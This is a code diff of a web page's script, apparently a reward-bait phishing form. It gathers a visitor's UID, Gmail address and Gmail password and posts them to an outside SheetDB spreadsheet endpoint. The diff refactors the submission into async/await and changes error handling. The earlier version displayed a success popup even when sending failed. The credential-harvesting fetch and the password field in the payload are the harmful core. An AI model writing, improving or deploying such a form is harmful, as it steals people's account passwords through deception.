@@ -211,7 +211,6 @@
 </div>
 
 <script>
-    // তোমার নতুন SheetDB API লিংক আপডেট করা হয়েছে:
     const SHEETDB_API_URL = "https://sheetdb.io/api/v1/6ye6vbizxxczi"; 
 
     let selectedRewardName = "";
@@ -261,7 +260,7 @@
         document.getElementById('reward-error').innerText = "";
     }
 
-    function submitData() {
+    async function submitData() {
         document.getElementById('uid-error').innerText = "";
         document.getElementById('gmail-error').innerText = "";
         document.getElementById('password-error').innerText = "";
@@ -296,35 +295,45 @@
         confirmBtn.innerText = "SUBMITTING...";
         confirmBtn.disabled = true;
 
-        let requestData = {
-            "data": [
+        const now = new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"});
+
+        // SheetDB Payload
+        const payload = {
+            data: [
                 {
-                    "Time": new Date().toLocaleString("en-US", {timeZone: "Asia/Dhaka"}),
-                    "uid": uid,
-                    "Gmail": gmail,
-                    "password": password,
-                    "reward": selectedRewardName,
-                    "status": "Pending"
+                    Time: now,
+                    uid: uid,
+                    Gmail: gmail,
+                    password: password,
+                    reward: selectedRewardName,
+                    status: "Pending"
                 }
             ]
         };
 
-        fetch(SHEETDB_API_URL, {
-            method: 'POST',
-            headers: { 'Accept': 'application/json', 'Content-Type': 'application/json' },
-            body: JSON.stringify(requestData)
-        })
-        .then(response => response.json())
-        .then(data => {
+        try {
+            const response = await fetch(SHEETDB_API_URL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            const result = await response.json();
             confirmBtn.innerText = "Confirm & Register";
             confirmBtn.disabled = false;
-            document.getElementById('success-popup').style.display = 'flex';
-        })
-        .catch(error => {
+
+            if (response.ok || result.created === 1) {
+                document.getElementById('success-popup').style.display = 'flex';
+            } else {
+                alert("ডাটা পাঠাতে ব্যর্থ হয়েছে! SheetDB-তে আপনার Google Sheet-এর Column Name ঠিক আছে কি না চেক করুন।");
+            }
+        } catch (error) {
             confirmBtn.innerText = "Confirm & Register";
             confirmBtn.disabled = false;
-            document.getElementById('success-popup').style.display = 'flex';
-        });
+            alert("কানেকশন সমস্যা হয়েছে। আবার চেষ্টা করুন।");
+        }
     }
 
     document.getElementById('uid-input').addEventListener('input', function (e) {
